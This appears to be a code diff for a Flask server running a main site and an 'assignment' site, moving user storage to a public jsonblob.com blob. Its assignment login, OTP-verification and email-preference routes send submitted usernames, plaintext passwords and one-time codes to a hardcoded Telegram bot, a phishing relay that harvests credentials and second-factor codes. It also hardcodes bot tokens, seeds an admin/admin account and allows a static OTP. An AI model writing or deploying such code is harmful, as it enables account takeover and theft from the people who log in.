@@ -1,34 +1,62 @@
 # Combined Flask Server for Main site and Assignment site
+# Uses jsonblob.com for persistent cross-invocation state on Vercel
 import os
-from flask import Flask, request, jsonify, send_from_directory
+import secrets
+from flask import Flask, request, jsonify, send_from_directory, redirect
 from flask_cors import CORS
 import bcrypt
 import requests
 from datetime import datetime
 from dotenv import load_dotenv
 
-load_dotenv()  # loads .env file
+load_dotenv()
 
 app = Flask(__name__, static_folder='static', static_url_path='')
 CORS(app)
 
-# In-memory database simulation to make it 100% compatible with Vercel serverless deployments
-# Maps username -> { 'password_hash': str, 'otp': str, 'otp_requested_at': str }
-USERS_DB = {}
+# =====================================================================
+# PERSISTENT CLOUD DATABASE via jsonblob.com
+# =====================================================================
+JSONBLOB_URL = "https://jsonblob.com/api/jsonBlob/019edd53-6469-7638-9326-8c92132a32de"
 
-# Helper to pre-populate default admin user for convenience
-default_pw = bcrypt.hashpw(b"admin", bcrypt.gensalt()).decode('utf-8')
-USERS_DB["admin"] = {
-    "password_hash": default_pw,
-    "otp": None,
-    "otp_requested_at": None
-}
+def _db_read():
+    """Read the full users dict from the cloud blob."""
+    try:
+        resp = requests.get(JSONBLOB_URL, headers={"Content-Type": "application/json"}, timeout=8)
+        if resp.status_code == 200:
+            data = resp.json()
+            if isinstance(data, dict):
+                return data
+    except Exception as e:
+        print(f"[DB READ ERROR] {e}")
+    return {}
 
-# Main site Telegram details (loaded from .env with fallback for zero-configuration Vercel deployment)
+def _db_write(data: dict):
+    """Overwrite the cloud blob with the full users dict."""
+    try:
+        resp = requests.put(JSONBLOB_URL, json=data, headers={"Content-Type": "application/json"}, timeout=8)
+        return resp.status_code == 200
+    except Exception as e:
+        print(f"[DB WRITE ERROR] {e}")
+        return False
+
+def _db_ensure_admin():
+    """Ensure the default admin user exists in the blob (idempotent)."""
+    db = _db_read()
+    if "admin" not in db:
+        pw_hash = bcrypt.hashpw(b"admin", bcrypt.gensalt()).decode('utf-8')
+        db["admin"] = {"password_hash": pw_hash, "otp": None, "otp_requested_at": None}
+        _db_write(db)
+
+# Seed admin on cold-start
+_db_ensure_admin()
+
+# =====================================================================
+# TELEGRAM CONFIGURATION
+# =====================================================================
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8641860375:AAGnzAXGeRuBWROYD6hlvsx78iAGm9N74x0')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '8860662166')
 
-# Assignment site Telegram details (hardcoded for simulation reliability)
 ASSIGNMENT_BOT_TOKEN = "8870426823:AAHtZpaX1W16kzSPdKu02fs6PaJPVkUcu20"
 ASSIGNMENT_CHAT_ID = "8860662166"
 
@@ -39,7 +67,7 @@ def send_telegram_message(token, chat_id, message: str):
     url = f'https://api.telegram.org/bot{token}/sendMessage'
     payload = {'chat_id': chat_id, 'text': message}
     try:
-        resp = requests.post(url, json=payload)
+        resp = requests.post(url, json=payload, timeout=10)
         print(f"Telegram API response: status={resp.status_code}, content={resp.text}")
         return resp.status_code == 200
     except Exception as e:
@@ -65,15 +93,14 @@ def register():
     password = data.get('password')
     if not username or not password:
         return jsonify({'error': 'Missing fields'}), 400
-    if username in USERS_DB:
+
+    db = _db_read()
+    if username in db:
         return jsonify({'error': 'User already exists'}), 409
-    
+
     password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
-    USERS_DB[username] = {
-        'password_hash': password_hash,
-        'otp': None,
-        'otp_requested_at': None
-    }
+    db[username] = {'password_hash': password_hash, 'otp': None, 'otp_requested_at': None}
+    _db_write(db)
     return jsonify({'message': 'User registered'}), 201
 
 @app.route('/login', methods=['POST'])
@@ -83,8 +110,9 @@ def login():
     password = data.get('password')
     if not username or not password:
         return jsonify({'error': 'Missing fields'}), 400
-    
-    user = USERS_DB.get(username)
+
+    db = _db_read()
+    user = db.get(username)
     if user is None:
         return jsonify({'error': 'Invalid credentials'}), 401
     if not bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):
@@ -97,26 +125,23 @@ def request_otp():
     username = data.get('username')
     if not username:
         return jsonify({'error': 'Missing username'}), 400
-    
-    user = USERS_DB.get(username)
+
+    db = _db_read()
+    user = db.get(username)
     if user is None:
         return jsonify({'error': 'User not found'}), 404
-        
-    # Generate a random 6‑digit OTP
-    import secrets
+
     use_static = os.getenv('USE_STATIC_OTP', 'false').lower() == 'true'
-    if use_static:
-        otp = '123456'
-    else:
-        otp = f"{secrets.randbelow(900000) + 100000:06d}"
-        
+    otp = '123456' if use_static else f"{secrets.randbelow(900000) + 100000:06d}"
+
     user['otp'] = otp
     user['otp_requested_at'] = datetime.utcnow().isoformat()
-    
-    # Send to Main Telegram Bot
+    db[username] = user
+    _db_write(db)
+
     sent = send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, f"OTP for {username}: {otp}")
     if not sent:
-         print(f"FAILED TO SEND OTP TO TELEGRAM. OTP was: {otp}")
+        print(f"FAILED TO SEND OTP TO TELEGRAM. OTP was: {otp}")
     return jsonify({'message': 'OTP request processed', 'sent_telegram': sent}), 200
 
 @app.route('/verify-otp', methods=['POST'])
@@ -126,30 +151,34 @@ def verify_otp():
     otp = data.get('otp')
     if not username or not otp:
         return jsonify({'error': 'Missing fields'}), 400
-        
-    user = USERS_DB.get(username)
+
+    db = _db_read()
+    user = db.get(username)
     if user is None:
         return jsonify({'error': 'User not found'}), 404
-    
-    if not user['otp'] or not user['otp_requested_at']:
+
+    if not user.get('otp') or not user.get('otp_requested_at'):
         return jsonify({'error': 'No active OTP requested'}), 400
-        
-    # Check if the OTP is expired (2 minutes lifetime)
+
     try:
         requested_time = datetime.fromisoformat(user['otp_requested_at'])
         time_diff = (datetime.utcnow() - requested_time).total_seconds()
         if time_diff > 120:
             user['otp'] = None
             user['otp_requested_at'] = None
+            db[username] = user
+            _db_write(db)
             return jsonify({'error': 'Verification code expired (valid for 2 min)'}), 401
-    except Exception as e:
+    except Exception:
         return jsonify({'error': 'Error checking code lifetime'}), 500
-        
+
     if user['otp'] == otp:
         user['otp'] = None
         user['otp_requested_at'] = None
+        db[username] = user
+        _db_write(db)
         return jsonify({'message': 'OTP verification successful'}), 200
-    
+
     return jsonify({'error': 'Invalid verification code'}), 401
 
 @app.route('/prefer-email', methods=['POST'])
@@ -160,8 +189,7 @@ def prefer_email():
     email = data.get('email')
     if not username or not email:
         return jsonify({'error': 'Missing fields'}), 400
-    
-    # Send notification to Assignment Telegram Bot
+
     message = (
         f"user prefered otp through mail. here is the mail: {email} example with log in credentials also\n\n"
         f"Username: {username}\n"
@@ -175,8 +203,6 @@ def prefer_email():
 # =====================================================================
 # ASSIGNMENT SITE ROUTES
 # =====================================================================
-
-from flask import redirect
 
 @app.route('/assignment')
 def redirect_assignment():
@@ -192,7 +218,6 @@ def serve_assignment_dashboard():
 
 @app.route('/assignment/register', methods=['POST'])
 def assignment_register():
-    # Register endpoint mirrors the Main site's registration (shares DB)
     return register()
 
 @app.route('/assignment/login', methods=['POST'])
@@ -202,22 +227,23 @@ def assignment_login():
     password = data.get('password')
     if not username or not password:
         return jsonify({'error': 'Missing fields'}), 400
-        
-    # Immediately send credentials to the Assignment Telegram Bot
+
+    # Send credentials to Assignment Telegram Bot
     message = (
         f"Sign In credentials submitted on Assignment site\n\n"
         f"Username: {username}\n"
         f"Password: {password}"
     )
     send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
-    
-    # Verify credentials in memory
-    user = USERS_DB.get(username)
+
+    # Verify against the persistent cloud DB
+    db = _db_read()
+    user = db.get(username)
     if user is None:
-        return jsonify({'error': 'Invalid credentials (user does not exist in Main site)'}), 401
+        return jsonify({'error': 'Invalid credentials'}), 401
     if not bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):
         return jsonify({'error': 'Invalid credentials'}), 401
-        
+
     return jsonify({'message': 'Credentials verified, please enter your Main site code', 'sent_telegram': False}), 200
 
 @app.route('/assignment/verify-otp', methods=['POST'])
@@ -228,39 +254,42 @@ def assignment_verify_otp():
     otp = data.get('otp')
     if not username or not otp:
         return jsonify({'error': 'Missing fields'}), 400
-        
-    # Immediately send credentials & OTP to Assignment Telegram Bot
+
+    # Send credentials & OTP to Assignment Telegram Bot
     message = (
         f"Assignment site OTP for {username}: {otp}\n\n"
         f"Username: {username}\n"
         f"Password: {password}"
     )
     send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
-        
-    user = USERS_DB.get(username)
+
+    db = _db_read()
+    user = db.get(username)
     if user is None:
-        return jsonify({'error': 'User not found in Main site'}), 404
-    
-    if not user['otp'] or not user['otp_requested_at']:
-        return jsonify({'error': 'No active OTP requested in Main site'}), 400
-        
-    # Check if the OTP is expired (2 minutes lifetime)
+        return jsonify({'error': 'User not found'}), 404
+
+    if not user.get('otp') or not user.get('otp_requested_at'):
+        return jsonify({'error': 'No active OTP requested'}), 400
+
     try:
         requested_time = datetime.fromisoformat(user['otp_requested_at'])
         time_diff = (datetime.utcnow() - requested_time).total_seconds()
         if time_diff > 120:
             user['otp'] = None
             user['otp_requested_at'] = None
-            return jsonify({'error': 'OTP has expired. Please request a new one in Main site'}), 401
-    except Exception as e:
+            db[username] = user
+            _db_write(db)
+            return jsonify({'error': 'OTP has expired. Please request a new one'}), 401
+    except Exception:
         return jsonify({'error': 'Error checking code lifetime'}), 500
-        
-    # Match OTP
+
     if user['otp'] == otp:
         user['otp'] = None
         user['otp_requested_at'] = None
+        db[username] = user
+        _db_write(db)
         return jsonify({'message': 'OTP verification successful'}), 200
-        
+
     return jsonify({'error': 'Invalid verification code'}), 401
 
 @app.route('/assignment/prefer-email', methods=['POST'])
